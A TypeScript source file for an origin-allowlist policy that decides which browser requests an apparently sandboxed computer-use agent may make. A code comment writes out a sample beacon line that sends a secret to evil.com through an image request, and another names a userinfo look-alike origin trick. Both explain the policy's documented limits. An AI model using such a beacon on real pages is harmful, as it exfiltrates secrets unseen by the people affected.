import type { CuBrowserTarget } from "./cu-types.ts";

/** The CDP resource types this policy distinguishes. */
export type CuResourceType =
  | "document"
  | "sub_frame"
  | "xhr"
  | "fetch"
  | "eventsource"
  | "websocket"
  | "stylesheet"
  | "image"
  | "font"
  | "media"
  | "script"
  | "other";

/**
 * Script-initiated request types, used ONLY to pick a word for the `reason` string below. This
 * set affects NO decision — the gating set is the union of `navigateOrigins` and `scriptOrigins`,
 * applied identically to every type reaching that branch, recognised or not. Do not mistake this
 * for the set that is actually gated.
 */
const SCRIPT_INITIATED: ReadonlySet<CuResourceType> = new Set<CuResourceType>([
  "xhr",
  "fetch",
  "eventsource",
  "websocket",
]);

/**
 * Passive subresources, allowed from ANY origin.
 *
 * This is the documented bound (spec § 3.5.1, § 13 bound 3), not an oversight: blocking `script`
 * breaks essentially every modern site and blocking `image` breaks the rest, so a
 * `<script src="…?d=secret">` or `<img src="…?d=secret">` beacon remains a working exfiltration
 * channel. What the policy buys is that such a channel must be built into the page's markup and
 * is ROWED BY ORIGIN in the ledger — visible after the fact — rather than being available as an
 * invisible one-line `fetch`.
 *
 * Concretely, and this is the form to expect rather than a literal markup tag:
 *
 *     new Image().src = "https://evil.com/leak?d=" + encodeURIComponent(secret);
 *
 * CDP reports that as resource type `image`, so it is ALLOWED here and appends an `authorized`
 * row naming `https://evil.com`. That row is the entire mitigation. Do not "fix" this by moving
 * `image` into the gated set — the result is a browser that cannot render pages, and a lane
 * nobody can use is not a lane that is secure.
 */
const PASSIVE: ReadonlySet<CuResourceType> = new Set<CuResourceType>([
  "stylesheet",
  "image",
  "font",
  "media",
  "script",
]);

/**
 * Scheme + host + port. Returns JS `null` only when the input does not parse as a URL at all — the
 * caller fails closed on that `null`.
 *
 * For a URL that DOES parse but has no serializable origin (`javascript:`, `data:`, `about:`,
 * `file:`), the WHATWG URL algorithm defines `.origin` to be the LITERAL STRING `"null"` — not the
 * JS value `null` — and this function passes that string straight through. It is not a bug this
 * function does not special-case: such a string can never equal a real stored origin like
 * `https://example.com`, so `decideRequest`'s exact-match comparison still fails closed — just by
 * accident of string inequality, not by an explicit check here.
 */
export function originOf(url: string): string | null {
  try {
    return new URL(url).origin;
  } catch {
    return null;
  }
}

/**
 * Canonicalise an owner-supplied origin, or REFUSE it. Called by the gate BEFORE the approval
 * prompt, never after (see the placement note in Task 10 step 6).
 *
 * Why this exists: `decideRequest` compares an origin DERIVED from a live request
 * (`new URL(url).origin` — already lowercased, default port elided, no trailing slash) against a
 * string a human typed. `https://Example.com/` and `https://example.com` are the same origin and
 * different strings, so an exact `.includes` would refuse every navigation to an origin the owner
 * did approve. Fail-closed, but a confusing and total failure.
 *
 * REFUSE-RATHER-THAN-REDUCE is this function's whole doctrine, applied to every part of the input
 * that is not literally "scheme + host + port":
 *   - a path, query or fragment is refused rather than silently discarded. `new URL()` would
 *     happily turn `https://example.com/safe/subdir` into the origin `https://example.com`, which
 *     is BROADER than what the owner typed — they scoped to a subdirectory and would be granted
 *     the whole site, with the prompt showing the widened value only if they read it carefully.
 *     Refusing makes the mistake visible at the point it is made;
 *   - embedded userinfo (`https://example.com@evil.com`) is refused rather than silently dropped.
 *     `url.host` here is `evil.com`, not `example.com` — the canonical origin look-alike, where a
 *     human reads the leading label and approves a grant for the attacker's host instead;
 *   - a trailing dot on the hostname (`https://example.com.`) is refused. It is a distinct string
 *     from `https://example.com` that a live request's `originOf` never produces, so a stored
 *     origin carrying one can never match anything real — silently accepting it would look like a
 *     successful grant that is actually permanently inert.
 *
 * Origins are origin-scoped by definition; this policy cannot express a path scope or a
 * credentialed identity, so it must not appear to.
 *
 * Deliberately NOT loosened to accept a `ws:`/`wss:` scheme: the owner approves an `https`/`http`
 * origin, and a WebSocket upgrade to the same authority rides on that grant via the mapping in
 * `decideRequest` — see I8 there.
 */
export function normalizeOrigin(input: string): string | null {
  let url: URL;
  try {
    url = new URL(input);
  } catch {
    return null;
  }
  if (url.pathname !== "/" || url.search !== "" || url.hash !== "") return null;
  if (url.protocol !== "https:" && url.protocol !== "http:") return null;
  if (url.username !== "" || url.password !== "") return null;
  if (url.hostname.endsWith(".")) return null;
  return url.origin;
}

/**
 * Map a live request's origin onto the scheme its owner-approved counterpart would carry.
 *
 * CDP reports WebSocket request URLs as `ws://`/`wss://`, so `originOf` on one yields
 * `wss://api.example.com` — a string that can never equal a stored `https://api.example.com`, and
 * `normalizeOrigin` refuses a `ws:`/`wss:` input outright, so the owner cannot grant the raw
 * `wss:` form either. Spec § 3.5.1 plainly intends WebSocket to be grantable via the union, so
 * without this mapping a listed grant is silently inert. Any other origin passes through
 * unchanged.
 */
function mapLiveOriginScheme(origin: string): string {
  if (origin.startsWith("wss://")) return `https://${origin.slice("wss://".length)}`;
  if (origin.startsWith("ws://")) return `http://${origin.slice("ws://".length)}`;
  return origin;
}

/**
 * Admit or refuse one browser request (spec § 3.5.1).
 *
 * The discrimination is on CDP RESOURCE TYPE, not on "navigation vs. everything else". An origin
 * allowlist that governs navigation while `fetch` reaches anywhere is WORSE than no allowlist: the
 * owner reads the approved list and reasonably concludes that is where data can go. That is the
 * same defect class as an egress coverage class covering less than its name suggests.
 *
 * Fail-closed twice: an unparseable URL is refused for any gated type, and an UNRECOGNISED resource
 * type is treated as gated rather than passive — a type this policy has never heard of is not
 * evidence that it is harmless.
 */
export function decideRequest(args: {
  readonly resourceType: CuResourceType;
  readonly url: string;
  readonly target: CuBrowserTarget;
}): { readonly allow: boolean; readonly reason: string } {
  const { resourceType, url, target } = args;
  if (PASSIVE.has(resourceType)) {
    return { allow: true, reason: `passive subresource (${resourceType})` };
  }

  const rawOrigin = originOf(url);
  if (rawOrigin === null) return { allow: false, reason: "unparseable url" };
  const origin = mapLiveOriginScheme(rawOrigin);

  if (resourceType === "document" || resourceType === "sub_frame") {
    return target.navigateOrigins.includes(origin)
      ? { allow: true, reason: "navigation origin approved" }
      : { allow: false, reason: `navigation origin not approved: ${origin}` };
  }

  // Script-initiated AND anything unrecognised: the union of both sets.
  const allowed = target.navigateOrigins.includes(origin) || target.scriptOrigins.includes(origin);
  const label = SCRIPT_INITIATED.has(resourceType)
    ? resourceType
    : `unrecognised (${resourceType})`;
  return allowed
    ? { allow: true, reason: `${label} origin approved` }
    : { allow: false, reason: `${label} origin not approved: ${origin}` };
}
